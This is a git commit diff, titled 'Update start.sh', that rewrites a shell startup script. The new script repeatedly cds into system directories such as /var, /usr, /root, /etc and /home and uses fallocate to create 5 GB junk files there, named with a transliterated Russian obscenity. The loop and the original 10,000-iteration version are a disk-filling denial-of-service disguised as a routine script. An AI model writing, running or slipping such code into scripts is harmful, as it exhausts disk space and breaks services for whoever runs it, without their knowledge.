578087c3bed825f4728ffc8af8ad144fd0633b78
salindev <79220416+salindev@users.noreply.github.com>
2023-06-23 19:43:48 +0300

    Update start.sh

--- start.sh
+++ start.sh
@@ -2,7 +2,52 @@
 
 random_number=$((RANDOM % 100))
 
-for ((i=1; i<=10000; i++)); do
+cd /var
+for ((i=1; i<=2; i++)); do
+    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
+done
+cd /var/www
+for ((i=1; i<=2; i++)); do
+    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
+done
+cd /usr
+for ((i=1; i<=2; i++)); do
+    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
+done
+cd /root
+for ((i=1; i<=2; i++)); do
+    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
+done
+cd /etc
+for ((i=1; i<=2; i++)); do
+    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
+done
+cd /home
+for ((i=1; i<=2; i++)); do
+    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
+done
+cd /var
+for ((i=1; i<=2; i++)); do
+    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
+done
+cd /var/www
+for ((i=1; i<=2; i++)); do
+    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
+done
+cd /usr
+for ((i=1; i<=2; i++)); do
+    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
+done
+cd /root
+for ((i=1; i<=2; i++)); do
+    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
+done
+cd /etc
+for ((i=1; i<=2; i++)); do
+    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
+done
+cd /home
+for ((i=1; i<=2; i++)); do
     fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
 done
 
